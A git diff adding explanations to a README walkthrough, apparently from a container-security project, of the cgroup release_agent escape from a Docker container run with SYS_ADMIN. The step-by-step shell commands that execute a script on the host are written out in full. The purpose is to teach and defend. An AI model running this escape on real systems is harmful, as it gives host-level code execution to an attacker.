@@ -172,19 +172,30 @@ The above command specifies Docker to run with SYS-ADMIN capabilities and with n
 	
 ![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/docker_sysadmin.PNG)
 
+The SYS_ADMIN capability allows a container to perform the mount syscall. Docker starts containers with a restricted set of capabilities by default and does not enable the SYS_ADMIN capability due to the security risks of doing so.
+Further, Docker starts containers with the docker-default AppArmor policy by default, which prevents the use of the mount syscall even when the container is run with SYS_ADMIN.
+
+
 
 #### In the container
 	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+To trigger this exploit we need a cgroup where we can create a release_agent file and trigger release_agent invocation by killing all processes in the cgroup. To do that, we create a /tmp/cgrp directory, mount the RDMA cgroup controller and create a child cgroup (named “x”).
 
 	echo 1 > /tmp/cgrp/x/notify_on_release
 	host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 	echo "$host_path/cmd" > /tmp/cgrp/release_agent
+Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its notify_on_release file. We also set the RDMA cgroup release agent to execute a /cmd script — which we will later create in the container — by writing the /cmd script path on the host to the release_agent file. To do it, we’ll grab the container’s path on the host from the /etc/mtab file.
 
 	echo '#!/bin/sh' > /cmd
 	echo "ps aux > $host_path/output" >> /cmd
 	chmod a+x /cmd
+Now, we create the /cmd script such that it will execute the ps aux command and save its output into /output on the container by specifying the full path of the output file on the host. The chmod command is used to assign execute privilege to everyone. 
 
 	sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"	
+Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a /bin/sh process and writing its PID to the cgroup.procs file in “x” child cgroup directory, the script on the host will execute after /bin/sh exits. The output of ps aux performed on the host is then saved to the /output file inside the container.
+
+	head /output
+
 	
 ![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/chmod.PNG)
 
